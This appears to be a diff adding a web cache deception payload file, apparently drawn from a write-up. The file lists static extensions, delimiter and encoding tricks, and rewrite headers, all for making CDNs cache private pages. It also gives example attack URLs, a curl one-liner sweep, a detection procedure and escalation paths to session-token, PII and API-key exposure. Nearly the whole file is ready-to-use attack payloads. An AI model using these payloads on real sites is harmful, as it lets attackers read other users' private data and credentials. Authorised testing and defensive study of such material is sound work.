@@ -1,0 +1,79 @@
+# Web Cache Deception payloads — distilled from packs/writeups/mastering-web-cache-deception-… (CoffinXP)
+# Trick: CDN caches by extension → append a "static" extension to a private page, victim visits, cache serves it to attacker.
+# Precondition: CDN/reverse-proxy that caches .css/.js/.jpg/.png/.svg/.woff by URL suffix, and origin ignores the suffix.
+
+# ── Static-extension suffix (classic) ─────────────────────
+# Take a private page like /account or /profile.php and append:
+.css
+.js
+.jpg
+.png
+.svg
+.gif
+.ico
+.woff
+.woff2
+.ttf
+.eot
+.pdf
+.map
+
+# ── Example URLs ──────────────────────────────────────────
+# https://target.com/account/style.css       ← private page cached as CSS
+# https://target.com/profile.php/poc.css     ← origin runs PHP, CDN caches HTML
+# https://target.com/dashboard.png
+# https://target.com/orders.jpg
+# https://target.com/admin.css/login
+
+# ── Path Poison (extension in path) ───────────────────────
+# https://target.com/account.css
+# https://target.com/settings.js
+# https://target.com/private/orders.pdf
+
+# ── Obfuscated path (URL-encoded slash) ───────────────────
+# https://target.com/account%2fstyle.css
+# https://target.com/profile%3ftest=1.js
+# https://target.com/settings/%2e%2e/images/logo.png
+# https://target.com/profile/%2e%2e/assets/styles.css
+
+# ── Delimiter tricks (some caches split on ; @ , !) ───────
+# https://target.com/account;random.js
+# https://target.com/profile@anything.css
+# https://target.com/account,x.png
+# https://target.com/settings!extra.svg
+# https://target.com/dashboard~backup.jpg
+# https://target.com/user:data.css
+# https://target.com/account@cache.png
+
+# ── Query-string static (some CDNs cache on ? too) ────────
+# https://target.com/account.css?test=123
+# https://target.com/dashboard.jpg?test=123
+# https://target.com/settings?theme=dark.css
+# https://target.com/user?resource=profile.jpg
+# https://target.com/profile?version=1.css
+
+# ── Hash / fragment (rare but seen) ───────────────────────
+# https://target.com/dashboard#section.css
+# https://target.com/private/../secret.css
+# https://target.com/profile.edit.jpg
+
+# ── Header-based hint (proxies honoring X-Forwarded-Path) ─
+# X-Forwarded-Path: /static.css
+# X-Rewrite-URL: /style.css
+# X-Original-URL: /image.png
+
+# ── Detection oracle ──────────────────────────────────────
+# 1. Log in as user A. Note account content.
+# 2. Fetch https://target/account/deception.css — status 200, body = HTML of /account.
+# 3. Log out. Open incognito. Fetch the SAME URL. If body still has user A data → cache stored it → VULN.
+# 4. Check response headers: cf-cache-status: HIT / x-cache: HIT / age: > 0 = cached response.
+
+# ── One-liner sweep ───────────────────────────────────────
+# for p in .css .js .jpg .png .svg /style.css /main.js; do
+#   curl -sI "https://target.com/account$p" | grep -iE 'cache|age:|x-cache'
+# done
+
+# ── Escalation ────────────────────────────────────────────
+# WCD → session token exfil (if page has CSRF token / JWT in HTML)
+# WCD → PII disclosure (address, email, phone in profile)
+# WCD → API key exposure (dashboards show integration keys)
